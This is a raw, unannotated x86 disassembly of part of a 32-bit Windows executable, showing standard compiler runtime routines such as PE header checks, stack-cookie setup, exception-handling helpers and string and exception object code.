  4046fc:	mov    edx,0x5a4d
  404701:	cmp    WORD PTR [eax],dx
  404704:	jne    0x404738
  404706:	mov    edx,DWORD PTR [eax+0x3c]
  404709:	test   edx,edx
  40470b:	js     0x404738
  40470d:	cmp    edx,0x10000000
  404713:	jae    0x404738
  404715:	add    eax,edx
  404717:	mov    DWORD PTR [ebp-0x1c],eax
  40471a:	mov    ecx,DWORD PTR [eax]
  40471c:	sub    ecx,0x4550
  404722:	neg    ecx
  404724:	sbb    ecx,ecx
  404726:	not    ecx
  404728:	and    ecx,eax
  40472a:	jmp    0x404735
  40472c:	xor    eax,eax
  40472e:	inc    eax
  40472f:	ret    
  404730:	mov    esp,DWORD PTR [ebp-0x18]
  404733:	xor    ecx,ecx
  404735:	mov    DWORD PTR [ebp-0x1c],ecx
  404738:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40473f:	mov    eax,ecx
  404741:	call   0x404c09
  404746:	ret    0x4
  404749:	int3   
  40474a:	int3   
  40474b:	int3   
  40474c:	int3   
  40474d:	int3   
  40474e:	mov    edi,edi
  404750:	push   ebp
  404751:	mov    ebp,esp
  404753:	push   0x0
  404755:	call   DWORD PTR ds:0x40706c
  40475b:	test   eax,eax
  40475d:	je     0x40477f
  40475f:	push   eax
  404760:	call   0x4046df
  404765:	test   eax,eax
  404767:	je     0x40477f
  404769:	movzx  ecx,WORD PTR [eax+0x5c]
  40476d:	push   0x2
  40476f:	pop    eax
  404770:	cmp    cx,ax
  404773:	je     0x404782
  404775:	cmp    ecx,0x3
  404778:	jne    0x40477f
  40477a:	xor    eax,eax
  40477c:	inc    eax
  40477d:	pop    ebp
  40477e:	ret    
  40477f:	mov    eax,DWORD PTR [ebp+0x8]
  404782:	pop    ebp
  404783:	ret    
  404784:	int3   
  404785:	int3   
  404786:	int3   
  404787:	int3   
  404788:	int3   
  404789:	int3   
  40478a:	jmp    DWORD PTR ds:0x407100
  404790:	int3   
  404791:	int3   
  404792:	int3   
  404793:	int3   
  404794:	int3   
  404795:	int3   
  404796:	int3   
  404797:	int3   
  404798:	int3   
  404799:	int3   
  40479a:	int3   
  40479b:	int3   
  40479c:	int3   
  40479d:	int3   
  40479e:	int3   
  40479f:	int3   
  4047a0:	mov    edi,edi
  4047a2:	push   ebp
  4047a3:	mov    ebp,esp
  4047a5:	mov    eax,DWORD PTR [ebp+0x8]
  4047a8:	xor    edx,edx
  4047aa:	push   ebx
  4047ab:	push   esi
  4047ac:	push   edi
  4047ad:	mov    ecx,DWORD PTR [eax+0x3c]
  4047b0:	add    ecx,eax
  4047b2:	movzx  eax,WORD PTR [ecx+0x14]
  4047b6:	movzx  ebx,WORD PTR [ecx+0x6]
  4047ba:	add    eax,0x18
  4047bd:	add    eax,ecx
  4047bf:	test   ebx,ebx
  4047c1:	je     0x4047de
  4047c3:	mov    edi,DWORD PTR [ebp+0xc]
  4047c6:	mov    esi,DWORD PTR [eax+0xc]
  4047c9:	cmp    edi,esi
  4047cb:	jb     0x4047d6
  4047cd:	mov    ecx,DWORD PTR [eax+0x8]
  4047d0:	add    ecx,esi
  4047d2:	cmp    edi,ecx
  4047d4:	jb     0x4047e0
  4047d6:	inc    edx
  4047d7:	add    eax,0x28
  4047da:	cmp    edx,ebx
  4047dc:	jb     0x4047c6
  4047de:	xor    eax,eax
  4047e0:	pop    edi
  4047e1:	pop    esi
  4047e2:	pop    ebx
  4047e3:	pop    ebp
  4047e4:	ret    
  4047e5:	int3   
  4047e6:	int3   
  4047e7:	int3   
  4047e8:	int3   
  4047e9:	int3   
  4047ea:	int3   
  4047eb:	int3   
  4047ec:	int3   
  4047ed:	int3   
  4047ee:	int3   
  4047ef:	int3   
  4047f0:	mov    edi,edi
  4047f2:	push   ebp
  4047f3:	mov    ebp,esp
  4047f5:	push   0xfffffffe
  4047f7:	push   0x405888
  4047fc:	push   0x404a30
  404801:	mov    eax,fs:0x0
  404807:	push   eax
  404808:	sub    esp,0x8
  40480b:	push   ebx
  40480c:	push   esi
  40480d:	push   edi
  40480e:	mov    eax,ds:0x406004
  404813:	xor    DWORD PTR [ebp-0x8],eax
  404816:	xor    eax,ebp
  404818:	push   eax
  404819:	lea    eax,[ebp-0x10]
  40481c:	mov    fs:0x0,eax
  404822:	mov    DWORD PTR [ebp-0x18],esp
  404825:	mov    DWORD PTR [ebp-0x4],0x0
  40482c:	push   0x400000
  404831:	call   0x4048c0
  404836:	add    esp,0x4
  404839:	test   eax,eax
  40483b:	je     0x404891
  40483d:	mov    eax,DWORD PTR [ebp+0x8]
  404840:	sub    eax,0x400000
  404845:	push   eax
  404846:	push   0x400000
  40484b:	call   0x4047a0
  404850:	add    esp,0x8
  404853:	test   eax,eax
  404855:	je     0x404891
  404857:	mov    eax,DWORD PTR [eax+0x24]
  40485a:	shr    eax,0x1f
  40485d:	not    eax
  40485f:	and    eax,0x1
  404862:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  404869:	mov    ecx,DWORD PTR [ebp-0x10]
  40486c:	mov    DWORD PTR fs:0x0,ecx
  404873:	pop    ecx
  404874:	pop    edi
  404875:	pop    esi
  404876:	pop    ebx
  404877:	mov    esp,ebp
  404879:	pop    ebp
  40487a:	ret    
  40487b:	mov    eax,DWORD PTR [ebp-0x14]
  40487e:	mov    eax,DWORD PTR [eax]
  404880:	xor    ecx,ecx
  404882:	cmp    DWORD PTR [eax],0xc0000005
  404888:	sete   cl
  40488b:	mov    eax,ecx
  40488d:	ret    
  40488e:	mov    esp,DWORD PTR [ebp-0x18]
  404891:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  404898:	xor    eax,eax
  40489a:	mov    ecx,DWORD PTR [ebp-0x10]
  40489d:	mov    DWORD PTR fs:0x0,ecx
  4048a4:	pop    ecx
  4048a5:	pop    edi
  4048a6:	pop    esi
  4048a7:	pop    ebx
  4048a8:	mov    esp,ebp
  4048aa:	pop    ebp
  4048ab:	ret    
  4048ac:	int3   
  4048ad:	int3   
  4048ae:	int3   
  4048af:	int3   
  4048b0:	int3   
  4048b1:	int3   
  4048b2:	int3   
  4048b3:	int3   
  4048b4:	int3   
  4048b5:	int3   
  4048b6:	int3   
  4048b7:	int3   
  4048b8:	int3   
  4048b9:	int3   
  4048ba:	int3   
  4048bb:	int3   
  4048bc:	int3   
  4048bd:	int3   
  4048be:	int3   
  4048bf:	int3   
  4048c0:	mov    edi,edi
  4048c2:	push   ebp
  4048c3:	mov    ebp,esp
  4048c5:	mov    eax,DWORD PTR [ebp+0x8]
  4048c8:	mov    ecx,0x5a4d
  4048cd:	cmp    WORD PTR [eax],cx
  4048d0:	je     0x4048d6
  4048d2:	xor    eax,eax
  4048d4:	pop    ebp
  4048d5:	ret    
  4048d6:	mov    ecx,DWORD PTR [eax+0x3c]
  4048d9:	add    ecx,eax
  4048db:	xor    eax,eax
  4048dd:	cmp    DWORD PTR [ecx],0x4550
  4048e3:	jne    0x4048f1
  4048e5:	mov    edx,0x10b
  4048ea:	cmp    WORD PTR [ecx+0x18],dx
  4048ee:	sete   al
  4048f1:	pop    ebp
  4048f2:	ret    
  4048f3:	int3   
  4048f4:	int3   
  4048f5:	int3   
  4048f6:	int3   
  4048f7:	int3   
  4048f8:	mov    edi,edi
  4048fa:	push   ebp
  4048fb:	mov    ebp,esp
  4048fd:	sub    esp,0x14
  404900:	and    DWORD PTR [ebp-0xc],0x0
  404904:	and    DWORD PTR [ebp-0x8],0x0
  404908:	mov    eax,ds:0x406004
  40490d:	push   esi
  40490e:	push   edi
  40490f:	mov    edi,0xbb40e64e
  404914:	mov    esi,0xffff0000
  404919:	cmp    eax,edi
  40491b:	je     0x40492a
  40491d:	test   esi,eax
  40491f:	je     0x40492a
  404921:	not    eax
  404923:	mov    ds:0x406008,eax
  404928:	jmp    0x404994
  40492a:	lea    eax,[ebp-0xc]
  40492d:	push   eax
  40492e:	call   DWORD PTR ds:0x40705c
  404934:	mov    eax,DWORD PTR [ebp-0x8]
  404937:	xor    eax,DWORD PTR [ebp-0xc]
  40493a:	mov    DWORD PTR [ebp-0x4],eax
  40493d:	call   DWORD PTR ds:0x407064
  404943:	xor    DWORD PTR [ebp-0x4],eax
  404946:	call   DWORD PTR ds:0x407060
  40494c:	xor    DWORD PTR [ebp-0x4],eax
  40494f:	call   DWORD PTR ds:0x407058
  404955:	xor    eax,DWORD PTR [ebp-0x4]
  404958:	lea    ecx,[ebp-0x4]
  40495b:	xor    eax,ecx
  40495d:	mov    DWORD PTR [ebp-0x4],eax
  404960:	lea    eax,[ebp-0x14]
  404963:	push   eax
  404964:	call   DWORD PTR ds:0x407068
  40496a:	mov    eax,DWORD PTR [ebp-0x10]
  40496d:	xor    eax,DWORD PTR [ebp-0x14]
  404970:	mov    ecx,DWORD PTR [ebp-0x4]
  404973:	xor    ecx,eax
  404975:	cmp    ecx,edi
  404977:	je     0x404981
  404979:	test   DWORD PTR ds:0x406004,esi
  40497f:	jne    0x404986
  404981:	mov    ecx,0xbb40e64f
  404986:	mov    DWORD PTR ds:0x406004,ecx
  40498c:	not    ecx
  40498e:	mov    DWORD PTR ds:0x406008,ecx
  404994:	pop    edi
  404995:	pop    esi
  404996:	mov    esp,ebp
  404998:	pop    ebp
  404999:	ret    
  40499a:	int3   
  40499b:	int3   
  40499c:	int3   
  40499d:	int3   
  40499e:	int3   
  40499f:	int3   
  4049a0:	xor    eax,eax
  4049a2:	ret    
  4049a3:	int3   
  4049a4:	int3   
  4049a5:	int3   
  4049a6:	int3   
  4049a7:	int3   
  4049a8:	push   0x30000
  4049ad:	push   0x10000
  4049b2:	call   DWORD PTR ds:0x407124
  4049b8:	pop    ecx
  4049b9:	pop    ecx
  4049ba:	ret    
  4049bb:	int3   
  4049bc:	int3   
  4049bd:	int3   
  4049be:	int3   
  4049bf:	int3   
  4049c0:	jmp    DWORD PTR ds:0x4070e0
  4049c6:	int3   
  4049c7:	int3   
  4049c8:	int3   
  4049c9:	int3   
  4049ca:	int3   
  4049cb:	int3   
  4049cc:	push   0x404a30
  4049d1:	push   DWORD PTR fs:0x0
  4049d8:	mov    eax,DWORD PTR [esp+0x10]
  4049dc:	mov    DWORD PTR [esp+0x10],ebp
  4049e0:	lea    ebp,[esp+0x10]
  4049e4:	sub    esp,eax
  4049e6:	push   ebx
  4049e7:	push   esi
  4049e8:	push   edi
  4049e9:	mov    eax,ds:0x406004
  4049ee:	xor    DWORD PTR [ebp-0x4],eax
  4049f1:	xor    eax,ebp
  4049f3:	mov    DWORD PTR [ebp-0x1c],eax
  4049f6:	push   eax
  4049f7:	mov    DWORD PTR [ebp-0x18],esp
  4049fa:	push   DWORD PTR [ebp-0x8]
  4049fd:	mov    eax,DWORD PTR [ebp-0x4]
  404a00:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  404a07:	mov    DWORD PTR [ebp-0x8],eax
  404a0a:	lea    eax,[ebp-0x10]
  404a0d:	mov    fs:0x0,eax
  404a13:	ret    
  404a14:	mov    ecx,DWORD PTR [ebp-0x1c]
  404a17:	xor    ecx,ebp
  404a19:	call   0x404560
  404a1e:	jmp    0x404c09
  404a23:	int3   
  404a24:	int3   
  404a25:	int3   
  404a26:	int3   
  404a27:	int3   
  404a28:	int3   
  404a29:	int3   
  404a2a:	int3   
  404a2b:	int3   
  404a2c:	int3   
  404a2d:	int3   
  404a2e:	int3   
  404a2f:	int3   
  404a30:	mov    edi,edi
  404a32:	push   ebp
  404a33:	mov    ebp,esp
  404a35:	push   DWORD PTR [ebp+0x14]
  404a38:	push   DWORD PTR [ebp+0x10]
  404a3b:	push   DWORD PTR [ebp+0xc]
  404a3e:	push   DWORD PTR [ebp+0x8]
  404a41:	push   0x404560
  404a46:	push   0x406004
  404a4b:	call   0x404c22
  404a50:	add    esp,0x18
  404a53:	pop    ebp
  404a54:	ret    
  404a55:	int3   
  404a56:	int3   
  404a57:	int3   
  404a58:	int3   
  404a59:	int3   
  404a5a:	mov    edi,edi
  404a5c:	push   ebp
  404a5d:	mov    ebp,esp
  404a5f:	push   0x0
  404a61:	call   DWORD PTR ds:0x407070
  404a67:	push   DWORD PTR [ebp+0x8]
  404a6a:	call   DWORD PTR ds:0x407054
  404a70:	push   0xc0000409
  404a75:	call   DWORD PTR ds:0x407050
  404a7b:	push   eax
  404a7c:	call   DWORD PTR ds:0x40704c
  404a82:	pop    ebp
  404a83:	ret    
  404a84:	int3   
  404a85:	int3   
  404a86:	int3   
  404a87:	int3   
  404a88:	int3   
  404a89:	mov    edi,edi
  404a8b:	push   ebp
  404a8c:	mov    ebp,esp
  404a8e:	sub    esp,0x324
  404a94:	mov    ds:0x4062a0,eax
  404a99:	mov    DWORD PTR ds:0x40629c,ecx
  404a9f:	mov    DWORD PTR ds:0x406298,edx
  404aa5:	mov    DWORD PTR ds:0x406294,ebx
  404aab:	mov    DWORD PTR ds:0x406290,esi
  404ab1:	mov    DWORD PTR ds:0x40628c,edi
  404ab7:	data16 mov WORD PTR ds:0x4062b8,ss
  404abe:	data16 mov WORD PTR ds:0x4062ac,cs
  404ac5:	data16 mov WORD PTR ds:0x406288,ds
  404acc:	data16 mov WORD PTR ds:0x406284,es
  404ad3:	data16 mov WORD PTR ds:0x406280,fs
  404ada:	data16 mov WORD PTR ds:0x40627c,gs
  404ae1:	pushf  
  404ae2:	pop    DWORD PTR ds:0x4062b0
  404ae8:	mov    eax,DWORD PTR [ebp+0x0]
  404aeb:	mov    ds:0x4062a4,eax
  404af0:	mov    eax,DWORD PTR [ebp+0x4]
  404af3:	mov    ds:0x4062a8,eax
  404af8:	lea    eax,[ebp+0x8]
  404afb:	mov    ds:0x4062b4,eax
  404b00:	mov    eax,DWORD PTR [ebp-0x324]
  404b06:	mov    DWORD PTR ds:0x4061f0,0x10001
  404b10:	mov    eax,ds:0x4062a8
  404b15:	mov    ds:0x4061ac,eax
  404b1a:	mov    DWORD PTR ds:0x4061a0,0xc0000409
  404b24:	mov    DWORD PTR ds:0x4061a4,0x1
  404b2e:	mov    DWORD PTR ds:0x4061b0,0x3
  404b38:	push   0x4
  404b3a:	pop    eax
  404b3b:	imul   eax,eax,0x0
  404b3e:	mov    DWORD PTR [eax+0x4061b4],0x2
  404b48:	push   0x4
  404b4a:	pop    eax
  404b4b:	shl    eax,0x0
  404b4e:	mov    ecx,DWORD PTR ds:0x406004
  404b54:	mov    DWORD PTR [eax+0x4061b4],ecx
  404b5a:	push   0x4
  404b5c:	pop    eax
  404b5d:	shl    eax,1
  404b5f:	mov    ecx,DWORD PTR ds:0x406008
  404b65:	mov    DWORD PTR [eax+0x4061b4],ecx
  404b6b:	push   0x4
  404b6d:	pop    eax
  404b6e:	imul   eax,eax,0x0
  404b71:	mov    ecx,DWORD PTR ds:0x406004
  404b77:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  404b7b:	push   0x4
  404b7d:	pop    eax
  404b7e:	shl    eax,0x0
  404b81:	mov    ecx,DWORD PTR ds:0x406008
  404b87:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  404b8b:	push   0x401124
  404b90:	call   0x404a5a
  404b95:	mov    esp,ebp
  404b97:	pop    ebp
  404b98:	ret    
  404b99:	int3   
  404b9a:	int3   
  404b9b:	int3   
  404b9c:	int3   
  404b9d:	int3   
  404b9e:	jmp    DWORD PTR ds:0x4070d8
  404ba4:	int3   
  404ba5:	int3   
  404ba6:	int3   
  404ba7:	int3   
  404ba8:	int3   
  404ba9:	int3   
  404baa:	jmp    DWORD PTR ds:0x407108
  404bb0:	int3   
  404bb1:	int3   
  404bb2:	int3   
  404bb3:	int3   
  404bb4:	int3   
  404bb5:	int3   
  404bb6:	jmp    DWORD PTR ds:0x407114
  404bbc:	int3   
  404bbd:	int3   
  404bbe:	int3   
  404bbf:	int3   
  404bc0:	int3   
  404bc1:	int3   
  404bc2:	int3   
  404bc3:	int3   
  404bc4:	push   0x404a30
  404bc9:	push   DWORD PTR fs:0x0
  404bd0:	mov    eax,DWORD PTR [esp+0x10]
  404bd4:	mov    DWORD PTR [esp+0x10],ebp
  404bd8:	lea    ebp,[esp+0x10]
  404bdc:	sub    esp,eax
  404bde:	push   ebx
  404bdf:	push   esi
  404be0:	push   edi
  404be1:	mov    eax,ds:0x406004
  404be6:	xor    DWORD PTR [ebp-0x4],eax
  404be9:	xor    eax,ebp
  404beb:	push   eax
  404bec:	mov    DWORD PTR [ebp-0x18],esp
  404bef:	push   DWORD PTR [ebp-0x8]
  404bf2:	mov    eax,DWORD PTR [ebp-0x4]
  404bf5:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  404bfc:	mov    DWORD PTR [ebp-0x8],eax
  404bff:	lea    eax,[ebp-0x10]
  404c02:	mov    fs:0x0,eax
  404c08:	ret    
  404c09:	mov    ecx,DWORD PTR [ebp-0x10]
  404c0c:	mov    DWORD PTR fs:0x0,ecx
  404c13:	pop    ecx
  404c14:	pop    edi
  404c15:	pop    edi
  404c16:	pop    esi
  404c17:	pop    ebx
  404c18:	mov    esp,ebp
  404c1a:	pop    ebp
  404c1b:	push   ecx
  404c1c:	ret    
  404c1d:	int3   
  404c1e:	int3   
  404c1f:	int3   
  404c20:	int3   
  404c21:	int3   
  404c22:	jmp    DWORD PTR ds:0x407128
  404c28:	int3   
  404c29:	int3   
  404c2a:	int3   
  404c2b:	int3   
  404c2c:	int3   
  404c2d:	int3   
  404c2e:	jmp    DWORD PTR ds:0x4070b8
  404c34:	int3   
  404c35:	int3   
  404c36:	int3   
  404c37:	int3   
  404c38:	int3   
  404c39:	mov    edi,edi
  404c3b:	push   ebp
  404c3c:	mov    ebp,esp
  404c3e:	mov    eax,DWORD PTR [ebp+0x8]
  404c41:	xor    ecx,ecx
  404c43:	test   eax,eax
  404c45:	je     0x404c5e
  404c47:	cmp    eax,0xffffffff
  404c4a:	ja     0x404c59
  404c4c:	push   eax
  404c4d:	call   0x404c2e
  404c52:	pop    ecx
  404c53:	mov    ecx,eax
  404c55:	test   ecx,ecx
  404c57:	jne    0x404c5e
  404c59:	jmp    0x405015
  404c5e:	mov    eax,ecx
  404c60:	pop    ebp
  404c61:	ret    
  404c62:	int3   
  404c63:	int3   
  404c64:	int3   
  404c65:	int3   
  404c66:	int3   
  404c67:	mov    edi,edi
  404c69:	push   ebp
  404c6a:	mov    ebp,esp
  404c6c:	push   esi
  404c6d:	push   DWORD PTR [ebp+0x8]
  404c70:	mov    esi,ecx
  404c72:	and    DWORD PTR [esi+0x10],0x0
  404c76:	mov    DWORD PTR [esi+0x14],0xf
  404c7d:	mov    BYTE PTR [esi],0x0
  404c80:	call   0x405357
  404c85:	pop    ecx
  404c86:	push   eax
  404c87:	push   DWORD PTR [ebp+0x8]
  404c8a:	mov    ecx,esi
  404c8c:	call   0x40513e
  404c91:	mov    eax,esi
  404c93:	pop    esi
  404c94:	pop    ebp
  404c95:	ret    0x4
  404c98:	int3   
  404c99:	int3   
  404c9a:	int3   
  404c9b:	int3   
  404c9c:	int3   
  404c9d:	int3   
  404c9e:	int3   
  404c9f:	int3   
  404ca0:	mov    edi,edi
  404ca2:	push   ebp
  404ca3:	mov    ebp,esp
  404ca5:	push   ecx
  404ca6:	push   esi
  404ca7:	push   DWORD PTR [ebp+0x8]
  404caa:	mov    esi,ecx
  404cac:	mov    DWORD PTR [ebp-0x4],esi
  404caf:	call   0x405500
  404cb4:	mov    DWORD PTR [esi],0x40112c
  404cba:	mov    eax,esi
  404cbc:	pop    esi
  404cbd:	mov    esp,ebp
  404cbf:	pop    ebp
  404cc0:	ret    0x4
  404cc3:	int3   
  404cc4:	int3   
  404cc5:	int3   
  404cc6:	int3   
  404cc7:	int3   
  404cc8:	mov    edi,edi
  404cca:	push   ebp
  404ccb:	mov    ebp,esp
  404ccd:	push   ecx
  404cce:	push   esi
  404ccf:	push   0x1
  404cd1:	lea    eax,[ebp-0x4]
  404cd4:	mov    DWORD PTR [ebp-0x4],0x401134
  404cdb:	push   eax
  404cdc:	mov    esi,ecx
  404cde:	call   0x4054ea
  404ce3:	mov    DWORD PTR [esi],0x40112c
  404ce9:	mov    eax,esi
  404ceb:	pop    esi
  404cec:	mov    esp,ebp
  404cee:	pop    ebp
  404cef:	ret    
  404cf0:	int3   
  404cf1:	int3   
  404cf2:	int3   
  404cf3:	int3   
  404cf4:	int3   
  404cf5:	int3   
  404cf6:	int3   
  404cf7:	int3   
  404cf8:	int3   
  404cf9:	int3   
  404cfa:	int3   
  404cfb:	int3   
  404cfc:	int3   
  404cfd:	int3   
  404cfe:	int3   
  404cff:	int3   
  404d00:	mov    edi,edi
  404d02:	push   ebp
  404d03:	mov    ebp,esp
  404d05:	push   ecx
  404d06:	push   esi
  404d07:	push   DWORD PTR [ebp+0x8]
  404d0a:	mov    esi,ecx
  404d0c:	mov    DWORD PTR [ebp-0x4],esi
  404d0f:	call   0x405500
  404d14:	mov    DWORD PTR [esi],0x401144
  404d1a:	mov    eax,esi
  404d1c:	pop    esi
  404d1d:	mov    esp,ebp
  404d1f:	pop    ebp
  404d20:	ret    0x4
  404d23:	int3   
  404d24:	int3   
  404d25:	int3   
  404d26:	int3   
  404d27:	int3   
  404d28:	mov    edi,edi
  404d2a:	push   ebp
  404d2b:	mov    ebp,esp
  404d2d:	push   ecx
  404d2e:	mov    eax,DWORD PTR [ebp+0x8]
  404d31:	push   esi
  404d32:	mov    esi,ecx
  404d34:	mov    DWORD PTR [ebp-0x4],esi
  404d37:	mov    DWORD PTR [ebp-0x4],eax
  404d3a:	lea    eax,[ebp-0x4]
  404d3d:	push   eax
  404d3e:	call   0x4054de
  404d43:	mov    DWORD PTR [esi],0x401144
  404d49:	mov    eax,esi
  404d4b:	pop    esi
  404d4c:	mov    esp,ebp
  404d4e:	pop    ebp
  404d4f:	ret    0x4
  404d52:	int3   
  404d53:	int3   
  404d54:	int3   
  404d55:	int3   
  404d56:	int3   
  404d57:	int3   
  404d58:	int3   
  404d59:	int3   
  404d5a:	int3   
  404d5b:	int3   
  404d5c:	int3   
  404d5d:	int3   
  404d5e:	int3   
  404d5f:	int3   
  404d60:	mov    DWORD PTR [ecx],0x40112c
  404d66:	jmp    0x40550c
  404d6b:	int3   
  404d6c:	int3   
  404d6d:	int3   
  404d6e:	int3   
  404d6f:	int3   
  404d70:	jmp    0x40550c
  404d75:	int3   
  404d76:	int3   
  404d77:	int3   
  404d78:	int3   
  404d79:	int3   
  404d7a:	mov    edi,edi
  404d7c:	push   ebp
  404d7d:	mov    ebp,esp
  404d7f:	mov    edx,DWORD PTR [ebp+0x8]
  404d82:	mov    eax,DWORD PTR [ecx+0x4]
  404d85:	cmp    eax,DWORD PTR [edx+0x4]
  404d88:	jne    0x404d95
  404d8a:	mov    eax,DWORD PTR [ecx]
  404d8c:	cmp    eax,DWORD PTR [edx]
  404d8e:	jne    0x404d95
  404d90:	xor    eax,eax
  404d92:	inc    eax
  404d93:	jmp    0x404d97
  404d95:	xor    eax,eax
  404d97:	pop    ebp
  404d98:	ret    0x4
  404d9b:	int3   
  404d9c:	int3   
  404d9d:	int3   
  404d9e:	int3   
  404d9f:	int3   
  404da0:	mov    edi,edi
  404da2:	push   ebp
  404da3:	mov    ebp,esp
  404da5:	test   BYTE PTR [ebp+0x8],0x1
  404da9:	push   esi
  404daa:	mov    esi,ecx
  404dac:	mov    DWORD PTR [esi],0x40114c
  404db2:	je     0x404dbb
  404db4:	push   esi
  404db5:	call   0x4041ea
  404dba:	pop    ecx
  404dbb:	mov    eax,esi
  404dbd:	pop    esi
  404dbe:	pop    ebp
  404dbf:	ret    0x4
  404dc2:	int3   
  404dc3:	int3   
  404dc4:	int3   
  404dc5:	int3   
  404dc6:	int3   
  404dc7:	int3   
  404dc8:	int3   
  404dc9:	int3   
  404dca:	int3   
  404dcb:	int3   
  404dcc:	int3   
  404dcd:	int3   
  404dce:	int3   
  404dcf:	int3   
  404dd0:	mov    edi,edi
  404dd2:	push   ebp
  404dd3:	mov    ebp,esp
  404dd5:	push   esi
  404dd6:	mov    esi,ecx
  404dd8:	mov    DWORD PTR [esi],0x40112c
  404dde:	call   0x40550c
  404de3:	test   BYTE PTR [ebp+0x8],0x1
  404de7:	je     0x404df0
  404de9:	push   esi
  404dea:	call   0x4041ea
  404def:	pop    ecx
  404df0:	mov    eax,esi
  404df2:	pop    esi
  404df3:	pop    ebp
  404df4:	ret    0x4
  404df7:	int3   
  404df8:	int3   
  404df9:	int3   
  404dfa:	int3   
  404dfb:	int3   
  404dfc:	int3   
  404dfd:	int3   
  404dfe:	int3   
  404dff:	int3   
  404e00:	mov    edi,edi
  404e02:	push   ebp
  404e03:	mov    ebp,esp
  404e05:	push   esi
  404e06:	mov    esi,ecx
  404e08:	call   0x40550c
  404e0d:	test   BYTE PTR [ebp+0x8],0x1
  404e11:	je     0x404e1a
  404e13:	push   esi
  404e14:	call   0x4041ea
  404e19:	pop    ecx
  404e1a:	mov    eax,esi
  404e1c:	pop    esi
  404e1d:	pop    ebp
  404e1e:	ret    0x4
  404e21:	int3   
  404e22:	int3   
  404e23:	int3   
  404e24:	int3   
  404e25:	int3   
  404e26:	push   0x10
  404e28:	mov    eax,0x405697
  404e2d:	call   0x4055d7
  404e32:	mov    esi,ecx
  404e34:	mov    DWORD PTR [ebp-0x18],esi
  404e37:	mov    edi,DWORD PTR [ebp+0x8]
  404e3a:	or     edi,0xf
  404e3d:	cmp    edi,0xfffffffe
  404e40:	jbe    0x404e47
  404e42:	mov    edi,DWORD PTR [ebp+0x8]
  404e45:	jmp    0x404e71
  404e47:	xor    edx,edx
  404e49:	mov    DWORD PTR [ebp-0x14],0x3
  404e50:	mov    eax,edi
  404e52:	mov    ebx,DWORD PTR [esi+0x14]
  404e55:	div    DWORD PTR [ebp-0x14]
  404e58:	mov    ecx,ebx
  404e5a:	shr    ecx,1
  404e5c:	cmp    ecx,eax
  404e5e:	jbe    0x404e71
  404e60:	push   0xfffffffe
  404e62:	pop    eax
  404e63:	sub    eax,ecx
  404e65:	cmp    ebx,eax
  404e67:	ja     0x404e6e
  404e69:	lea    edi,[ecx+ebx*1]
  404e6c:	jmp    0x404e71
  404e6e:	push   0xfffffffe
  404e70:	pop    edi
  404e71:	xor    ebx,ebx
  404e73:	lea    eax,[edi+0x1]
  404e76:	push   ebx
  404e77:	push   eax
  404e78:	mov    DWORD PTR [ebp-0x4],ebx
  404e7b:	call   0x404c39
  404e80:	pop    ecx
  404e81:	pop    ecx
  404e82:	mov    ecx,eax
  404e84:	mov    DWORD PTR [ebp-0x14],eax
  404e87:	jmp    0x404eb8
  404e89:	mov    eax,DWORD PTR [ebp+0x8]
  404e8c:	mov    DWORD PTR [ebp-0x10],esp
  404e8f:	mov    DWORD PTR [ebp-0x14],eax
  404e92:	inc    eax
  404e93:	push   0x0
  404e95:	push   eax
  404e96:	mov    BYTE PTR [ebp-0x4],0x2
  404e9a:	call   0x404c39
  404e9f:	pop    ecx
  404ea0:	mov    DWORD PTR [ebp-0x1c],eax
  404ea3:	mov    eax,0x404eaa
  404ea8:	pop    ecx
  404ea9:	ret    
  404eaa:	mov    edi,DWORD PTR [ebp-0x14]
  404ead:	xor    ebx,ebx
  404eaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  404eb2:	mov    esi,DWORD PTR [ebp-0x18]
  404eb5:	mov    DWORD PTR [ebp-0x14],ecx
  404eb8:	mov    eax,DWORD PTR [ebp+0xc]
  404ebb:	test   eax,eax
  404ebd:	je     0x404eda
  404ebf:	cmp    DWORD PTR [esi+0x14],0x10
  404ec3:	jb     0x404ec9
  404ec5:	mov    edx,DWORD PTR [esi]
  404ec7:	jmp    0x404ecb
  404ec9:	mov    edx,esi
  404ecb:	test   eax,eax
  404ecd:	je     0x404eda
  404ecf:	push   eax
  404ed0:	push   edx
  404ed1:	push   ecx
  404ed2:	call   0x40561e
  404ed7:	add    esp,0xc
  404eda:	push   ebx
  404edb:	push   0x1
  404edd:	mov    ecx,esi
  404edf:	call   0x404fca
  404ee4:	test   esi,esi
  404ee6:	je     0x404eed
  404ee8:	mov    eax,DWORD PTR [ebp-0x14]
  404eeb:	mov    DWORD PTR [esi],eax
  404eed:	mov    eax,DWORD PTR [ebp+0xc]
  404ef0:	mov    DWORD PTR [esi+0x14],edi
  404ef3:	mov    DWORD PTR [esi+0x10],eax
  404ef6:	cmp    edi,0x10
  404ef9:	jb     0x404efd
  404efb:	mov    esi,DWORD PTR [esi]
  404efd:	mov    BYTE PTR [esi+eax*1],bl
  404f00:	call   0x405537
  404f05:	ret    0x8
  404f08:	mov    ecx,DWORD PTR [ebp-0x18]
  404f0b:	xor    ebx,ebx
  404f0d:	push   ebx
  404f0e:	push   0x1
  404f10:	call   0x404fca
  404f15:	push   ebx
  404f16:	push   ebx
  404f17:	call   0x40552c
  404f1c:	int3   
  404f1d:	int3   
  404f1e:	int3   
  404f1f:	int3   
  404f20:	int3   
  404f21:	int3   
  404f22:	mov    edi,edi
  404f24:	push   ebp
  404f25:	mov    ebp,esp
  404f27:	push   esi
  404f28:	mov    esi,DWORD PTR [ebp+0x8]
  404f2b:	cmp    esi,0xfffffffe
  404f2e:	ja     0x404f7d
  404f30:	cmp    DWORD PTR [ecx+0x14],esi
  404f33:	jae    0x404f40
  404f35:	push   DWORD PTR [ecx+0x10]
  404f38:	push   esi
  404f39:	call   0x404e26
  404f3e:	jmp    0x404f70
  404f40:	cmp    BYTE PTR [ebp+0xc],0x0
  404f44:	je     0x404f5e
  404f46:	cmp    esi,0x10
  404f49:	jae    0x404f5e
  404f4b:	mov    eax,DWORD PTR [ecx+0x10]
  404f4e:	cmp    esi,eax
  404f50:	jae    0x404f54
  404f52:	mov    eax,esi
  404f54:	push   eax
  404f55:	push   0x1
  404f57:	call   0x404fca
  404f5c:	jmp    0x404f70
